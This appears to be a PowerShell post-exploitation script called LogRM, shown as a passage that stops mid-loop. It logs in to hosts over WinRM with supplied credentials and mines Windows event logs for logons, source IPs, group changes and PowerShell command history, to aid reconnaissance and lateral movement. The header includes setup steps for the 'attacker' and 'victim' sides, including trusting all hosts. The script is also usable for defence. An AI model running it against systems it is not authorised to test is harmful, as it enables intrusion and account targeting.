function LogRM {

      <#
      
      .Description 
		
		LogRM is a post exploitation powershell script which it uses windows event logs to gather information about internal network in a pentration testing engagment. 
		It is not only useful for blue teams but also for red teams because some of its functionalities can be used for lateral movement. You will be able to use LogRM not only on a localhost machine but
		also in a remote machine using WinRM protocol which is by default enabled in a newly Windows versions.
			
		
      .Configuration
	  
			Enable winrm to client side (attacker):

				winrm quickconfig
				winrm set winrm/config/client '@{TrustedHosts="*"}'
		
			On the server side (victim):
		
				Enable-PSRemoting -Force
				winrm quickconfig
       
       .Examples

            PS> LogRM -user <username> -pass <password> -ip <remote winrm ip> -eventID <eventID>
			PS> LogRM -user <username> -pass <password> -fips <file with ips> -eventID <eventID>
			PS> LogRM -ip 127.0.0.1 -eventID <eventID> 
                 
			PS> timeBomb -task now -newest <give a big number>
			PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number>
        
		
			for more examples: https://github.com/tasox/LogRM/blob/master/README.md
            

      #>
	  
      [CmdletBinding()]
	  Param([string]$domain,[string]$user,[string]$pass,[string]$ip,[switch]$remove,[string]$newest,[int]$eventID,[switch]$users,[string]$fips,[switch]$scheduler,[string]$task,[datetime]$at,[int]$loop,[datetime]$stoptime)
            
     
      
      if($ip -match '127.0.0.1')
      {
       
        
        if($eventID -eq "")
        {
            $events=(4624,4625,4634,4647,4728,4729,4732,4733,4738,4756,4757,4776,4688,400,600,500,501)
           
            #query all event id's and print the results
            for($counter=0;$counter -lt $events.length;$counter++)
            {
                $eventID=$events[$counter]
                start-Job -ScriptBlock ${function:logQuery} -ArgumentList $eventID,$newest | Out-Null
                Get-Job | Wait-Job | Receive-Job
            }
            
        
        }
        else
        {
            
            start-Job -ScriptBlock ${function:logQuery} -ArgumentList $eventID,$newest | Out-Null
            Write-Output "`n"
            Write-Output "`n"
            Get-Job | Wait-Job | Receive-Job
        }
        
        #Delete all jobs
        Get-Job | Remove-Job
        
      }
      else
      {
          try
          {

       
                    $mycreds=New-Object System.Management.Automation.PSCredential("$domain\$user",(ConvertTo-SecureString $pass -AsPlainText -Force))
                    if($fips)
                    {
                    #Read file with IPs
                    [array]$fileIPs=(Get-Content $fips | ? {$_.trim() -ne "" })
                   
                        for($count_ips=0;$count_ips -le $fileIPs.Length;$count_ips++)
                        {
                        
                        
                            try
                            {
                                #$session=New-PSSession -ComputerName $fileIPs[$count_ips] -Credential $mycreds -ErrorAction Stop
                                if((testConnectivity $fileIPs[$count_ips] 5985))
                                {
                                    $session=New-PSSession -ComputerName $fileIPs[$count_ips] -Credential $mycreds -ErrorAction Stop
                                    if($session)
                                    {
                                    Write-Host "Successfully connected with "$fileIPs[$count_ips] -ForegroundColor Green
                                    Write-Output "`n"
                                    }
                                    else
                                    {
                                    Write-Warning "Username or Password is wrong!"
                                    }
                                }
                                else
                                {
                                    Write-Host "Port 5985 is closed ->"$fileIPs[$count_ips] -ForegroundColor Red
                                }
                            }
                            catch
                            {
                            <# Nothing Here #>
                            }

                        }
                      }
                      else
                      {

                        #check if port 5985 is open before try to connect with the host
                        if((testConnectivity $ip 5985))
                        {
                       
                            if((Get-PSSession).ComputerName -eq $ip)
                            {
                                Write-Host "[!] You have already open connection with the host $ip" -ForegroundColor Yellow
                            }
                            else
                            {
                                $session=New-PSSession -ComputerName $ip -Credential $mycreds -ErrorAction Stop
                                if($session)
                                {
                        
                                    Write-Host "Successful connection with $ip" -ForegroundColor Green
                                    Write-Output "`n"
                        
                                }
                            
                            }

                        
                        }
                        else
                        {
                            Write-Host "Port 5985 is closed -> $ip" -ForegroundColor Red
                            Write-Output "`n"
                        }
                     
           
                    }

                    try
                    {
                        #Print Active Sessions
                        Write-Output "[+] WinRM Connections"
               
                        if(Get-PSSession)
                        {
        
                            Get-PSSession
                            Write-Output "`n"
                            Get-PSSession | Group-Object -Property ComputerName 
                            Write-Output "`n"   
                   
                            #[string]$WinrmId=Read-Host -Prompt "Give a session's id to retrieve logs (By default all)"
                            Write-Output "`n"
                    
                    
                            if($WinrmId -or !$WinrmId)
                            {


                      
                                  if($eventID -eq 4625){$eventID=4625}elseif($eventID -eq 4624){$eventID=4624}elseif($eventID -eq 4634){$eventID=4634}elseif($eventID -eq 4647){$eventID=4647}elseif($eventID -eq 4732){$eventID=4732}elseif($eventID -eq 4733){$eventID=4733}elseif($eventID -eq 4738){$eventID=4738}elseif($eventID -eq 4776){$eventID=4776}elseif($eventID -eq 4688){$eventID=4688}elseif($eventID -eq 4728){$eventID=4728}elseif($eventID -eq 4729){$eventID=4729}elseif($eventID -eq 4756){$eventID=4756}elseif($eventID -eq 4757){$eventID=4757}elseif($eventID -eq 400){$eventID=400}elseif($eventID -eq 600){$eventID=600}elseif($eventID -eq 500){$eventID=500}elseif($eventID -eq 501){$eventID=501}else{$eventID}
                                  if(!$newest){$newest=10}else{$newest=$newest}
                      
                                  Write-Output "`n"
                      
                      
                                  #Split session ids, add them to an array
                                  if([string]$WinrmId -match ',')
                                  { 
                                    $WinrmSIDArray=$WinrmId -split ','
                        
                                  }
                                  elseif($WinrmId -match ' ')
                                  {
                                    $WinrmSIDArray=$WinrmId -split ' '
                                  }
                                  elseif($WinrmId.Length -ne 0)
                                  {
                                    [array]$WinrmSIDArray=$WinrmId
                       
                                  }
                    
                                  #if user press enter which means all sessions
                                  else
                                  {
                       
                                    [array]$WinrmSIDArray=Get-PSSession | %{$_.Id}
                                  }

                      
                                   #check if user enter valid sessionID
                                   #Null sessionID = ALL Sessions
                      
                                   for($SessCounter=0;$SessCounter -lt $WinrmSIDArray.Length;$SessCounter++)
                                   { #1

                                       if((Get-PSSession).Id -contains $WinrmSIDArray[$SessCounter] -or ($WinrmSIDArray -eq ""))
                                       { #1

                            
                         
                                            try #1
                                            {

                              
                                
                                                Write-Host (Get-PSSession -Id $WinrmSIDArray[$SessCounter]  | select -Property id,Name,ComputerName) -ForegroundColor Green
                                    
                                                Invoke-Command -Session ( Get-PSSession -Id $WinrmSIDArray[$SessCounter]) -ArgumentList($users) -ScriptBlock ${function:logQuery}
                                
 
                                
                                             }# End of Try #1
                              
                                             catch #1
                                             {
                                                    <# Nothing Here #>

                                             }#close try/catch #1                    
                        
                         
                                       
                                        }# if/else #1
                                        else
                                        {
                                            Write-Host "[-] The session ID" $WinrmSIDArray[$SessCounter] "does not exist!" -ForegroundColor Red
                                        }#if statement checks for valid sessionID
                                    }# End For #1

                                 }#close if($winrmid)
                      

                              }
                              else
                              {
                                Write-Host "[-] No active sessions " -ForegroundColor Green
                
                              }
            
                         }
                         catch
                         {
                             Write-Output "Error!!!!"
                         }

                       }
                        catch
                        {
                            if(!$remove)
                            {
                                if((Get-PSSession | Group-Object -Property ComputerName).Count -lt 5)
                                {
                                    Write-Warning "[-] Please check again the Username or the Password."
                                    Write-Warning "[-] Maybe the specified credentials rejected by the server because of privileges."
                                }
                                else
                                {
                                    $t=(Get-PSSession | Group-Object -Property ComputerName).Name
                                    Write-Warning "[-] More than 5 connections in $t"
                                    Write-Warning "[-] Use> WinRMLog -remove"

                                }
                            }
                         }




                    if($remove) 
                    {
                        if(Get-PSSession)
                        {
                        Get-PSSession
                        $WinrmSessionIdDelete=Read-Host -Prompt "[-] Input winRM id Session to Delete"

                            if($WinrmSessionIdDelete -ne "" -and $WinrmSessionIdDelete)
                            {
                                Remove-PSSession -id $WinrmSessionIdDelete
                                Write-Host "[+] You successfully remove Sessions $WinrmSessionIdDelete" -ForegroundColor Green
                            }
                            else
                            {
                                Remove-PSSession -id (Get-PSSession | %{$_.Id})
                            }
                        }
                        else
                        {
                        Write-Host "[-] Session table is null!" -ForegroundColor Yellow
                        }
             
              
              
                     }

       }

}


function logQuery
{
   
    
    #Param($eventID,$newest)

    if($using:eventID -eq 4624)
    {
                                  
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4624) - An account was successfully logged on" 
        
		Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4624 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[5]}},@{Name="SourceIP";Expression={$_.ReplacementStrings[18]}},@{Name="SourcePort";Expression={$_.ReplacementStrings[19]}} | Format-Table -Property TimeGenerated,SourceIP,Username,MachineName -AutoSize
	
	}
    elseif($using:eventID -eq 4625)
    {
	    Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4625) - An account failed to log on"
		Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4625 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[5]}},@{Name="SourceIP";Expression={$_.ReplacementStrings[19]}},@{Name="SourcePort";Expression={$_.ReplacementStrings[20]}} | Format-Table -Property TimeGenerated,SourceIP,Username,MachineName
	
	}
	elseif($using:eventID -eq 4634)
	{
		Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4634) - An account was logged off"
		Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4634 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[1]}},@{Name="Security ID";Expression={$_.ReplacementStrings[0]}} | Format-Table -Property TimeGenerated,Username,"Security ID",MachineName

	}
    elseif($using:eventID -eq 4647)
    {
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4647) - User initiated logoff"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4647 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[1]}} | Format-Table -Property TimeGenerated,Username,MachineName
    }
    elseif($using:eventID -eq 4732)
    {
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4732) - A member was added to a security-enabled local group"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4732 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="AccountName";Expression={$_.ReplacementStrings[6]}},@{Name="Added User (SPN)";Expression={$_.ReplacementStrings[0]}},@{Name="Added User SID";Expression={$_.ReplacementStrings[1]}},@{Name="GroupName";Expression={$_.ReplacementStrings[2]}},@{Name="Group SID";Expression={$_.ReplacementStrings[4]}} | Format-Table -Property TimeGenerated,AccountName,'Added User (SPN)','Added User SID','GroupName','Group SID',MachineName

    }
    elseif($using:eventID -eq 4733)
    {
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4733) - A member was removed from a security-enabled local group"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4733 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="AccountName";Expression={$_.ReplacementStrings[6]}},@{Name="Removed User (SPN)";Expression={$_.ReplacementStrings[0]}},@{Name="Removed User SID";Expression={$_.ReplacementStrings[1]}},@{Name="GroupName";Expression={$_.ReplacementStrings[2]}},@{Name="Group SID";Expression={$_.ReplacementStrings[4]}} | Format-Table -Property TimeGenerated,AccountName,'Removed User (SPN)','Removed User SID','GroupName','Group SID',MachineName -AutoSize

    }
	elseif($using:eventID -eq 4756)
	{
		Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4756) - A member was added to a security-enabled universal group"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4756 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="AccountName";Expression={$_.ReplacementStrings[6]}},@{Name="Added User (SPN)";Expression={$_.ReplacementStrings[0]}},@{Name="Added User SID";Expression={$_.ReplacementStrings[1]}},@{Name="GroupName";Expression={$_.ReplacementStrings[2]}},@{Name="Group SID";Expression={$_.ReplacementStrings[4]}} | Format-Table -Property TimeGenerated,AccountName,'Added User (SPN)','Added User SID','GroupName','Group SID',MachineName
	}
	elseif($using:eventID -eq 4757)
	{
		Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4757) - A member was removed from a security-enabled universal group"
		Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4757 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="AccountName";Expression={$_.ReplacementStrings[6]}},@{Name="Added User (SPN)";Expression={$_.ReplacementStrings[0]}},@{Name="Added User SID";Expression={$_.ReplacementStrings[1]}},@{Name="GroupName";Expression={$_.ReplacementStrings[2]}},@{Name="Group SID";Expression={$_.ReplacementStrings[4]}} | Format-Table -Property TimeGenerated,AccountName,'Added User (SPN)','Added User SID','GroupName','Group SID',MachineName

	}
    elseif($using:eventID -eq 4738)
    {
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4738) - A user account was changed"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4738 | Where {$_.message -notmatch "Account Name:\s*\w+\$"}

    }
    elseif($using:eventID -eq 4776)
    {
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4776) - The domain controller attempted to validate the credentials for an account"
        $get4776=Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4776 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} |  Select -Property TimeGenerated,PSComputerName,MachineName,@{Name="Logon Account";Expression={$_.ReplacementStrings[1]}},@{Name="ComputerName (Source)";Expression={$_.ReplacementStrings[2]}}#,@{Name="Error Type";Expression={$_.ReplacementStrings[3]}}        
        Write-Output "`n"
        for($x=0;$x -lt $get4776.length; $x++)
        {
            Write-Host "Account Name:"$get4776[$x]."Logon Account" "| Source:"$get4776[$x].'ComputerName (Source)' "| Destination:"$get4776[$x].MachineName "| "$get4776[$x].TimeGenerated
        }
    }
    elseif($using:eventID -eq 4688)
    {
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4688) - A new process has been created"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4688 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property index,TimeGenerated,MachineName,@{Name="Creator SID";Expression={$_.ReplacementStrings[0]}},@{Name="Creator Account Name";Expression={$_.ReplacementStrings[1]}},@{Name="Target SID";Expression={$_.ReplacementStrings[9]}},@{Name="Target Account Name";Expression={$_.ReplacementStrings[10]}},@{Name="Target Account Domain";Expression={$_.ReplacementStrings[11]}},@{Name="Token Elevation Type";Expression={if($_.ReplacementStrings[6] -eq "%%1936"){ "full token - User Account Control is disabled" }elseif($_.ReplacementStrings[6] -eq "%%1937"){ "elevated token - User Account Control is enabled, program executed Run as administrator" }else{ "normal value - UAC is enabled, user starts a program from the Start Menu" }}},@{Name="Creator Process Name";Expression={$_.ReplacementStrings[13]}},@{Name="New Process Name";Expression={$_.ReplacementStrings[5]}} | format-list
    }
    elseif(($using:eventID -eq 400) -or ($using:eventID -eq 600))
    {
        if($using:eventID -eq 400)
        {
            $event400_600=400
            Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (400) - Windows PowerShell"
            Write-Output "`n"
        }
        else
        {
            $event400_600=600
            Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (600) - Windows PowerShell"
            Write-Output "`n"
        }

        try
        {
            $get400_600=Get-EventLog -Newest $using:newest -InstanceId $event400_600 -LogName "Windows Powershell" -ErrorAction Stop | select TimeGenerated,@{Name="HostApplication";Expression={$_.ReplacementStrings[2]}} | select TimeGenerated,HostApplication           

            if(($get400_600 | Measure-Object).count -gt 0)
            {
                $timeGenerated=($get400_600.TimeGenerated).DateTime
                $hostApplication=($get400_600.HostApplication | findstr -i "HostApplication")
                $engineVersion=($get400_600.HostApplication | findstr -i "EngineVersion")
                #$hostPSVersion=Get-Host | Select Version
        
        
                for($c=0;$c -lt $get400_600.length;$c++)
                {
                    if($hostApplication[$c].Split("=") -ne "")
                    {
                        Write-Host $timeGenerated[$c]
                        #Write-Host "Host PowerShell: "$hostPSVersion.Version
                        Write-Host $hostApplication[$c].Split("=")[1]
                        if($engineVersion[$c].split("=")[1] -eq "")
                        {
                            Write-Host "Command PS Version: -"
                        }
                        else
                        {
                            Write-Host "Command PS Version:"$engineVersion[$c].split("=")[1]
                        }
                        Write-Output "`n"
                
                     }
                }
            }
            else
            {
                <# #>
            }
        }
        catch
        {
            <# Try/Catch event 400/600#>
        }
    
    }
    elseif(($using:eventID -eq 500) -or ($using:eventID -eq 501))
    {
        if($using:eventID -eq 500)
        {
            $event500_501=500   
            Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (500) - Windows PowerShell"
            Write-Output "`n"
        }
        else
        {
            $event500_501=501
            Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (501) - Windows PowerShell"
            Write-Output "`n"
        }

        try
        {
            $get500_501=Get-EventLog -Newest $using:newest -InstanceId $event500_501 -LogName "Windows Powershell" | select TimeGenerated,PSComputerName,@{Name="Command";Expression={$_.ReplacementStrings[2]}} | select TimeGenerated,PSComputerName,Command
        

            if(($get500_501 | Measure-Object).count -gt 0)
            {
                $timeGenerated=($get500_501 | Select TimeGenerated)
                #$psComputerName=$get500_501.PsComputerName
                $commandPath=($get500_501 | Select Command) | format-List | findstr -i "CommandPath"
                $commandName=($get500_501 | Select Command) | format-List | findstr -i "CommandName"
                $commandType=($get500_501 | Select Command) | format-List | findstr -i "CommandType"
                $commandLine=($get500_501 | Select Command) | format-List | findstr -i "CommandLine"
                $engineVersion=($get500_501 | Select Command) | format-list | findstr -i "EngineVersion"
        
        
        
        
                for($c=0;$c -lt $get500_501.length;$c++)
                {
            
                    if($commandLine[$c].Split("=") -ne "")
                    {
                
                        Write-Host $timeGenerated[$c]
                        #Write-Host $psComputerName[$c]
                        if($commandName[$c].split("=")[1] -eq ""){Write-Host "CommandName: -"}else{Write-Host "CommandName: "$commandName[$c].split("=")[1].Trim(" ")}
                        if($commandType[$c].split("=")[1] -eq ""){Write-Host "CommandType: -"}else{Write-Host "CommandType: "$commandType[$c].split("=")[1].Trim(" ")}
                        if($commandPath[$c].split("=")[1] -eq ""){Write-Host "CommandPath: -"}else{Write-Host "CommandPath: "$commandPath[$c].split("=")[1].Trim(" ")}
                        if($commandLine[$c].split("=")[1] -eq ""){Write-Host "CommandLine: -"}else{Write-Host "CommandLine: "($commandLine[$c].split("=")[1]).Trim(" ")}
                        if($engineVersion[$c].split("=")[1] -eq ""){Write-Host "Command PS Version: -"}else{Write-Host "Command PS Version:"$engineVersion[$c].split("=")[1]}
                        Write-Output "`n"
                
                    }
                    else
                    {
                        <# #>
                    }
            
                }
            }
     }
     catch
     {
        <# Try/Catch event 500/501#>
     }
     
    }    
    elseif(($using:eventID -eq 4728) -or ($using:eventID -eq 4729))
    {
        if($using:eventID -eq 4728)
		{
			$event4728_29=4728
			Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID 4728 - A member was added to a security-enabled global group"
			$groupHistory=Get-EventLog -Newest $using:newest -LogName Security -Instanceid $event4728_29 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,@{Name="Account Name";Expression={$_.ReplacementStrings[0]}},@{Name="Security ID ";Expression={$_.ReplacementStrings[1]}}, @{Name="Added to Security Group";Expression={$_.ReplacementStrings[2]}}

		}
		else
		{
			$event4728_29=4729
			Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID 4729 - A member was removed from a security-enabled global group"
			$groupHistory=Get-EventLog -Newest $using:newest -LogName Security -Instanceid $event4728_29 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,@{Name="Account Name";Expression={$_.ReplacementStrings[0]}},@{Name="Security ID ";Expression={$_.ReplacementStrings[1]}}, @{Name="Removed from a Security Group";Expression={$_.ReplacementStrings[2]}}

		}
		
        #Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4728 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,@{Name="Account Name";Expression={$_.ReplacementStrings[0]}},@{Name="Security ID ";Expression={$_.ReplacementStrings[1]}}, @{Name="Added to Security Group";Expression={$_.ReplacementStrings[2]}} | Format-Table -AutoSize
        #$using:newest
        #[wmi] "win32_userAccount.Domain='hackme',Name='war'" | select -property sid
        $groupUsers=$groupHistory | Group-Object {$_."Account Name"} | Select -Property name,group
        
        #$groupHistory | Group-Object {$_."Account Name"} | Where-object {$_.Name -match "CN=$groupUsers"} | %{$_.Group} | Select -Property "Added to Security Group" 
        #loop
        $mySIDarray=New-Object System.Collections.ArrayList
        
        #Add unique SIDs to array
        for($sidcounter=0;$sidcounter -lt $groupHistory.length; $sidcounter++)
        {
            if($mySIDarray -notcontains ($groupHistory[$sidcounter] | Select -Property "Security ID ")."Security ID ")
            {
                #https://learn-powershell.net/2014/09/13/quick-hits-sending-data-to-null/
                $mySIDarray.add(($groupHistory[$sidcounter] | Select -Property "Security ID ")."Security ID ") | Out-Null
            }
        }
         
        for($c=0;$c -lt $groupUsers.length;$c++)
        {
           
           $userscn=$groupUsers[$c].Name
           Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Enumerating $userscn group history"
           $groupHistory | Group-Object {$_."Account Name"} | Where-object {$_.Name -match "$userscn"} | %{$_.Group} | Format-Table    #| Select -Property "Added to Security Group"
           Write-Output "`n"
           Write-Host "[*] " -ForegroundColor Yellow -Nonewline; Write-Output "Extra Information ..."
           #Convert SID to username and get user groups,comments
           $userSID=$mySIDarray[$c]         
           $accountName=([wmi]"win32_SID.SID='$userSID'").AccountName
           $userBelongToGroups=Invoke-Command -ScriptBlock {net user $accountName /domain | Select-String "Global Group"}
		   $userComment=Invoke-Command -ScriptBlock {net user $accountName /domain | Select-String -Pattern "^comment"}
		   Write-Output "Username> $accountName"
		   Write-Host "[!] User is currently belong to> $userBelongToGroups" -ForegroundColor Green
		   Write-Host "$userComment" -ForegroundColor Red
		   Write-Output "`n"

        }
       
        
    
    }
    else <# Executing all event logs if the user doesn't specify one #>
    {
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4624) - An account was successfully logged on" 
        
		Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4624 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[5]}},@{Name="SourceIP";Expression={$_.ReplacementStrings[18]}},@{Name="SourcePort";Expression={$_.ReplacementStrings[19]}} |Format-Table -Property TimeGenerated,SourceIP,Username,MachineName
	
	
	    Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4625) - An account failed to log on"
		Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4625 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[5]}},@{Name="SourceIP";Expression={$_.ReplacementStrings[19]}},@{Name="SourcePort";Expression={$_.ReplacementStrings[20]}} | Format-Table -Property TimeGenerated,SourceIP,Username,MachineName
	
		Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4634) - An account was logged off"
		Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4634 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[1]}},@{Name="Security ID";Expression={$_.ReplacementStrings[0]}} | Format-Table -Property TimeGenerated,Username,"Security ID",MachineName

	
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4647) - User initiated logoff"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4647 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[1]}} | Format-Table -Property TimeGenerated,Username,MachineName
        
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4732) - A member was added to a security-enabled local group"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4732 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="AccountName";Expression={$_.ReplacementStrings[6]}},@{Name="Added User SPN";Expression={$_.ReplacementStrings[0]}},@{Name="Added User SID";Expression={$_.ReplacementStrings[1]}},@{Name="GroupName";Expression={$_.ReplacementStrings[2]}},@{Name="Group SID";Expression={$_.ReplacementStrings[4]}} | Format-Table -Property TimeGenerated,AccountName,'Added User SPN','Added User SID','GroupName','Group SID',MachineName
    
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4733) - A member was removed from a security-enabled local group"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4733 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="AccountName";Expression={$_.ReplacementStrings[6]}},@{Name="Added User SPN";Expression={$_.ReplacementStrings[0]}},@{Name="Added User SID";Expression={$_.ReplacementStrings[1]}},@{Name="GroupName";Expression={$_.ReplacementStrings[2]}},@{Name="Group SID";Expression={$_.ReplacementStrings[4]}} | Format-Table -Property TimeGenerated,AccountName,'Added User SPN','Added User SID','GroupName','Group SID',MachineName

        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4738) - A user account was changed"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4738 | Where {$_.message -notmatch "Account Name:\s*\w+\$"}
        
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4776) - The domain controller attempted to validate the credentials for an account"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4776 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,PSComputerName,MachineName,@{Name="Logon Account";Expression={$_.ReplacementStrings[1]}},@{Name="ComputerName (Source)";Expression={$_.ReplacementStrings[2]}},@{Name="Error Type";Expression={$_.ReplacementStrings[3]}}
        
        Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4688) - A new process has been created"
        Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4688 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property index,TimeGenerated,MachineName,@{Name="Creator SID";Expression={$_.ReplacementStrings[0]}},@{Name="Creator Account Name";Expression={$_.ReplacementStrings[1]}},@{Name="Target SID";Expression={$_.ReplacementStrings[9]}},@{Name="Target Account Name";Expression={$_.ReplacementStrings[10]}},@{Name="Target Account Domain";Expression={$_.ReplacementStrings[11]}},@{Name="Token Elevation Type";Expression={if($_.ReplacementStrings[6] -eq "%%1936"){ "full token - User Account Control is disabled" }elseif($_.ReplacementStrings[6] -eq "%%1937"){ "elevated token - User Account Control is enabled, program executed Run as administrator" }else{ "normal value - UAC is enabled, user starts a program from the Start Menu" }}},@{Name="Creator Process Name";Expression={$_.ReplacementStrings[13]}},@{Name="New Process Name";Expression={$_.ReplacementStrings[5]}} | format-list
 
		Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4756) - A member was added to a security-enabled universal group"
		Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4756 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="AccountName";Expression={$_.ReplacementStrings[6]}},@{Name="Added User SPN";Expression={$_.ReplacementStrings[0]}},@{Name="Added User SID";Expression={$_.ReplacementStrings[1]}},@{Name="GroupName";Expression={$_.ReplacementStrings[2]}},@{Name="Group SID";Expression={$_.ReplacementStrings[4]}} | Format-Table -Property TimeGenerated,AccountName,'Added User SPN','Added User SID','GroupName','Group SID',MachineName

		Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4757) - A member was removed from a security-enabled universal group"
		Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4757 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,MachineName,@{Name="AccountName";Expression={$_.ReplacementStrings[6]}},@{Name="Added User SPN";Expression={$_.ReplacementStrings[0]}},@{Name="Added User SID";Expression={$_.ReplacementStrings[1]}},@{Name="GroupName";Expression={$_.ReplacementStrings[2]}},@{Name="Group SID";Expression={$_.ReplacementStrings[4]}} | Format-Table -Property TimeGenerated,AccountName,'Added User SPN','Added User SID','GroupName','Group SID',MachineName

		
		$event4728_29_array=@(4728,4729)
		foreach($event4728_29 in $event4728_29_array)
		{
			if($event4728_29 -eq 4728)
			{
				Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4728) - A member was added to a security-enabled global group"
				$groupHistory=Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4728 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,@{Name="Account Name";Expression={$_.ReplacementStrings[0]}},@{Name="Security ID ";Expression={$_.ReplacementStrings[1]}}, @{Name="Added to Security Group";Expression={$_.ReplacementStrings[2]}}
			}
			else
			{
				Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (4729) - A member was removed from a security-enabled global group"
				$groupHistory=Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4729 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property TimeGenerated,@{Name="Account Name";Expression={$_.ReplacementStrings[0]}},@{Name="Security ID ";Expression={$_.ReplacementStrings[1]}}, @{Name="Removed from a Security Group";Expression={$_.ReplacementStrings[2]}}

			}
			$groupUsers=$groupHistory | Group-Object {$_."Account Name"} | Select -Property name,group
        
			$mySIDarray=New-Object System.Collections.ArrayList
        
			#Add unique SIDs to array
